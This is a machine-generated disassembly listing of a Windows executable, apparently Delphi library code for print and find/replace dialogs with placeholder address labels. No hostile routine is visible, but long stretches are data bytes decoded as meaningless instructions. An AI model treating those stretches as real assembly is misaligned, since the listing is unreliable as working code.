mov eax esp
call sub_430a6c
mov eax [ esp ]
call sub_430bec
mov [ esi + 0x8 ] eax
xor eax eax
mov al [ edi + 0x63 ]
mov eax [ eax * 4 + rw-data ]
or eax 0x3000
mov [ esi + 0x14 ] eax
cmp [ edi + 0x60 ] 0x0
je r-xdata
test [ edi + 0x61 ] 0x1
jne r-xdata
add [ esi + 0x14 ] 0x10
test [ edi + 0x61 ] 0x2
jne r-xdata
add [ esi + 0x14 ] 0x100000
test [ edi + 0x61 ] 0x4
jne r-xdata
add [ esi + 0x14 ] 0x8
test [ edi + 0x61 ] 0x20
je r-xdata
add [ esi + 0x14 ] 0x4
cmp [ edi + 0x62 ] 0x0
je r-xdata
add [ esi + 0x14 ] 0x80000
test [ edi + 0x61 ] 0x10
je r-xdata
add [ esi + 0x14 ] 0x20
test [ edi + 0x61 ] 0x8
jne r-xdata
add [ esi + 0x14 ] 0x800
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
add [ esi + 0x14 ] 0x80
mov ax [ edi + 0x58 ]
mov [ esi + 0x18 ] ax
mov ax [ edi + 0x5c ]
mov [ esi + 0x1a ] ax
mov ax [ edi + 0x64 ]
mov [ esi + 0x1c ] ax
mov ax [ edi + 0x68 ]
mov [ esi + 0x1e ] ax
mov [ esi + 0x2a ] sub_42fdbc
mov [ esi + 0x2e ] sub_42fdbc
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov ecx esi
mov edx PrintDlgA
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
or [ esi + 0x14 ] 0x4000
mov [ esi + 0x32 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
call sub_430b70
test [ esi + 0x14 ] 0x10
setne al
mov [ edi + 0x60 ] al
test [ esi + 0x14 ] 0x20
setne al
mov [ edi + 0x62 ] al
mov eax [ esi + 0x14 ]
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
test al 0x2
je r-xdata
mov [ edi + 0x63 ] 0x1
jmp r-xdata
mov eax ebx
add esp 0x48
pop edi
pop esi
pop ebx
retn
push eax
call GlobalFree
mov [ edi + 0x63 ] 0x0
mov [ edi + 0x63 ] 0x2
jmp r-xdata
movzx eax [ esi + 0x18 ]
mov [ edi + 0x58 ] eax
movzx eax [ esi + 0x1a ]
mov [ edi + 0x5c ] eax
mov ax [ esi + 0x20 ]
cmp ax 0x1
jne r-xdata
movzx edx ax
mov eax edi
call sub_430c84
jmp r-xdata
call sub_42de20
call sub_42d8a4
mov edx eax
mov eax edi
call sub_430c84
jmp r-xdata
sub_430e44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
cmovae eax [ eax ]
adc [ edx ] al
add [ eax ] al
inc esp
pop ebp
inc esp
add [ edi + eax ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx + 0x43 ] dl
add [ edi + ecx + 0x43 ] bl
add [ eax ] dl
add al [ eax ]
add [ ebp + ebx * 2 + 0x44 ] al
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add al dh
lds eax [ eax + eax - 0x10 ]
adc al [ ebp ]
loopne r-xdata
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ eax ] bl
jecxz r-xdata
xor al 0x7
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add al al
cmovae eax [ eax ]
hlt
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add ah cl
les eax [ eax + eax + 0x4 ]
push cs
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
sub_430f08
or al 0x6
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ eax + ecx * 8 ] cl
inc esp
add [ eax + 0x400044ce ] ah
fadd [ eax + eax - 0x64 ]
cmovae eax [ eax ]
sub cl bl
inc esp
add [ eax - 0x29 ] bl
inc esp
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x19e00044 ] al
inc ebp
add [ eax ] dh
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
add [ ecx ] al
add [ ecx ] ah
mov al 0xfc
cmovae eax [ eax ]
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xc08b776f
je r-xdata
push edi
imul ebp [ esi + 0x64 ] 0xe8c776f
inc ebx
add al bh
pushad
inc esp
add [ ebx ] cl
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax - 0xd74a9ad ] dl
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d62c
mov [ esi + 0x4 ] 0x90000000
mov eax [ ebx + 0x20c ]
mov [ esi + 0x1c ] eax
pop esi
pop ebx
retn
inc ebx
add [ edi ] al
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
sub_430fc0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44e1b4
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0xb021
je r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
sub_431004
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_431040
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46bf08
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_431004
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46bf2c
jmp r-xdata
push ebp
call sub_431004
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46bf08
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46bf08
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46bf2c
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_46bf2c
jmp r-xdata
sub_4310f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_42fdbc
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_4313b4
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_43141c
push eax
mov eax esi
call sub_4313b4
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_43141c
inc eax
je r-xdata
push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_431040
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_43117c
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42fe24
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_4310f4
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_431226
add [ eax ] al
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40d788
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42fe6c
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_43127c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_446e44
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
xor edi edi
sub_4312b8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_4310f4
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c4cc
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_43127c
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_4507d8
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_4313cc
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_431434
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_42fea0
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_403450
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_403450
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_4507d8
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_43152c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404464
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_408c44
pop esi
pop ebx
retn
sub_431550
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404464
mov edx eax
lea eax [ ebx + 0x1ac ]
mov ecx 0xff
call sub_408c44
pop esi
pop ebx
retn
sub_431574
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43117c
mov eax ReplaceTextA
mov [ esi + 0x64 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_431658
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_40923c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_431808
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d78
call sub_431658
mov eax [ r-xdata ]
call sub_419e0c
mov eax [ r-xdata ]
call sub_419eac
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419e58
sub_431848
dec esp
sbb [ ebx ] al
add ecx [ edx ]
push esp
push ebx
push 0x54657061
jns r-xdata
add [ ecx + ebx + 0x43 ] cl
add [ eax ] al
mov eax [ 0x74004319 ]
add [ gs : eax ] eax
add [ eax ] al
add [ 0x48000000 ] al
sbb [ ebx ] al
or esi [ ebx + 0x74 ]
push edx
arpl [ gs : ecx + 0x6e ] si
insb
or [ gs : ebx + 0x74 ] dh
push ebx
jno r-xdata
int3
popad
jb r-xdata
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add ah cl
mov bl 0x44
or esi [ ebx + 0x74 ]
push edx
outsd
jne r-xdata
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ esi + edi + 0x43 ] ch
push edx
arpl [ gs : ebp + ecx + 0x73 ] si
je r-xdata
inc edx
xor al 0x7
outsd
jne r-xdata
add [ eax + eax * 8 - 0x4b5bffbc ] ch
inc esp
add al cl
stosd [ edi ]
push ebx
jno r-xdata
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0xbffbb6c ] cl
xchg ebx eax
inc esp
add [ eax + 0x4c00449d ] ah
pop es
inc edx
popad
jb r-xdata
inc ebx
or [ ebx + 0x74 ] esi
inc ebp
insb
insb
imul esi [ eax + 0x73 ] 0x74730865
inc ebx
imul esi [ edx + 0x63 ] 0x4508656c
js r-xdata
add [ esp + eax ] ch
inc ebx
je r-xdata
inc edx
add [ edi + eax + 0x42 ] dl
add al cl
cmp eax 0xaf3c0043
inc esp
add [ eax ] bh
scasd [ edi ]
inc esp
add [ eax ] cl
mov al 0x44
add ah bh
xchg edx eax
inc esp
add [ eax - 0x66 ] al
inc esp
add [ ecx + ebx * 4 - 0x5d33ffbc ] ah
inc esp
add [ edx + edx * 4 + 0x44 ] al
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ eax ] bh
mov dl 0x44
add ah dh
retn 0x44
sub al 0x4
insb
jb r-xdata
add [ eax ] eax
add [ eax ] ah
popad
inc esp
add [ edi + eax ] dh
sbb [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
sbb [ ebx ] eax
add [ eax ] al
add [ eax ] al
mov [ ecx ] ds
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx + 0x74004319 ] ah
add [ esp + eax ] dh
inc edx
jae r-xdata
sub_431978
mov [ esp + eax * 2 + 0x44a50000 ] fs
add [ ebp + edx * 4 + 0x44 ] dh
add al ah
movsb [ edi ] [ esi ]
inc esp
add [ eax + 0x100433e ] ch
add [ ebx ] dl
add al cl
aas
inc ebx
add [ ebx + edx * 2 ] cl
je r-xdata
add bh bh
sar [ edi ] 0x1
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4205000d ] al
jb r-xdata
insb
inc ebx
push 0x65676e61
push es
push esp
push ebx
push 0xac657061
sbb [ ebx ] eax
pop es
push es
push esp
push ebx
push 0xfc657061
sbb [ ebx ] al
adc al 0x62
inc esp
add [ edx ] ah
add [ eax ] cl
inc ebp
js r-xdata
add [ fs : eax ] al
jae r-xdata
inc [ ecx ]
inc ebx
je r-xdata
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
cmp [ esi + 0x44 ] al
add [ edx ] bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push cs
add [ edx ] cl
inc esp
jb r-xdata
insb
jae r-xdata
add bh bh
add [ eax ] eax
inc ebx
jne r-xdata
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
js r-xdata
add [ eax + 0x46 ] dl
inc esp
add [ ebx ] bl
add bh bh
int3
dec [ eax ]
jb r-xdata
dec [ esp + eax * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah 0xff
inc esp
add [ ecx ] ah
add bh bh
or al 0x93
inc esp
add [ eax + 0x4493 ] ch
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
adc [ eax ] al
add [ eax ] al
adc eax 0x68530500
popad
jo r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + 0x2cff0000 ] bl
mov eax [ 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc eax [ eax ]
push cs
push eax
popad
jb r-xdata
outsb
jae r-xdata
add bh bh
mov esp es
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
pushfd
sbb eax 0x16c0042
je r-xdata
mov eax [ 0xffffffffa0d00044 ]
add [ eax ] dl
inc eax
add [ ecx + 0x8ff0000 ] bl
outsd
ja r-xdata
outsb
je r-xdata
add eax 0x73757242
push r-xdata
jpe r-xdata
dec esp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ eax ]
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
je r-xdata
push edi
add [ eax ] al
imul ebp [ esi + 0x74 ] r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080016 ] al
push 0x6948776f
outsb
je r-xdata
push 0x6948776f
outsb
je r-xdata
add bh bh
jpe r-xdata
or eax [ ebx + 0x6f ]
adc [ edx ] 0x0
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax + 0x4f09001f ] al
outsb
dec ebp
outsd
jne r-xdata
fmul [ bp + 0x44 ]
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b001d ] al
outsb
dec ebp
outsd
jne r-xdata
push ecx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09001c ] al
outsb
push eax
add [ eax + 0x4f09001b ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x70 ] bp
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
and [ esi + 0x44 ] cl
add [ eax + eax ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
sbb al 0x42
add [ eax + 0x1 ] ch
add bh bh
fdivr [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030014 ] al
outsb
dec eax
sbb [ ebx ] al
jo r-xdata
sbb eax 0x1800043
add [ eax ] al
and [ ecx + 0x44 ] ah
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
push ebp
jo r-xdata
arpl [ ebx + 0x28 ] bp
push ecx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc esp
outsd
ja r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
or [ edi + 0x6e ] ecx
jo r-xdata
add bh bh
call 0x1435e71
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0021 ] al
outsb
push ebx
je r-xdata
push ebx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0020 ] al
outsb
push ebx
je r-xdata
je r-xdata
jb r-xdata
push esp
dec edi
inc esp
add al bl
add [ eax ] al
add [ eax ] eax
add [ eax ] al
pop ss
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x4656c62
push esi
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0018 ] al
outsb
inc ebx
outsd
outsb
push eax
inc esp
add al ch
add [ eax ] al
add ah cl
mov bl 0x44
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
inc eax
add [ eax - 0x4fffbe00 ] cl
xor al 0x40
jb r-xdata
add [ eax ] al
loopne r-xdata
add [ eax - 0xbffbb6c ] cl
inc esp
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax + eax * 2 ] al
inc ebx
add [ edi + ebp * 4 ] bh
inc esp
add [ eax + 0x45 ] dh
inc ebx
add [ eax ] cl
mov al 0x44
add ah bh
xchg edx eax
inc esp
add [ eax - 0x66 ] al
inc esp
add [ ecx + ebx * 4 - 0x5d33ffbc ] ah
inc esp
add [ edx + edx * 4 + 0x44 ] al
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ eax ] bh
mov dl 0x44
add ah dh
retn 0x44
add al 0x42
inc esp
jb r-xdata
add [ eax + eax * 2 - 0x3f53ffbd ] bl
inc esp
add [ esp + esi * 4 - 0x5437ffbc ] ah
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
inc esp
outsd
inc ebx
add dh ch
xchg ebx eax
inc esp
add [ eax + 0x4c00449d ] ah
pop es
inc edx
add [ esp + eax ] dh
inc edx
xchg esp eax
inc esp
add ah dh
lea eax [ bx + si ]
push eax
sbb eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
sbb eax 0x43
add [ eax ] al
add [ eax ] al
sub_43243e
xchg esp eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
js r-xdata
[ ecx ]
inc esp
add [ ecx ] ah
add bh bh
or al 0x93
inc esp
add [ eax + 0x4493 ] ch
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
cdq
add [ eax ] al
dec [ eax ]
and [ esi + 0x44 ] cl
add [ eax + eax ] dh
dec [ esp + eax * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x6f430b00
outsb
jae r-xdata
inc ebx
and al [ ebx ]
push 0x44ff0001
inc esi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
add [ eax + 0x1 ] ch
add bh bh
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x4327
inc ebx
je r-xdata
add [ eax + 0x53080010 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + 0x2cff0000 ] bl
mov eax [ 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push cs
add [ esi ] cl
push eax
popad
jb r-xdata
add [ edx + edx + 0x45 ] ch
add ah bh
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ ecx - 0x3d0bffbc ] dh
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add al cl
push eax
inc ebx
add [ eax + 0x400044ce ] ah
fadd [ eax + eax - 0x34 ]
dec esp
inc ebx
add [ eax ] ch
fld [ eax + eax + 0x58 ]
xlat
inc esp
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x45 ] cl
add [ eax + 0x30004352 ] cl
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
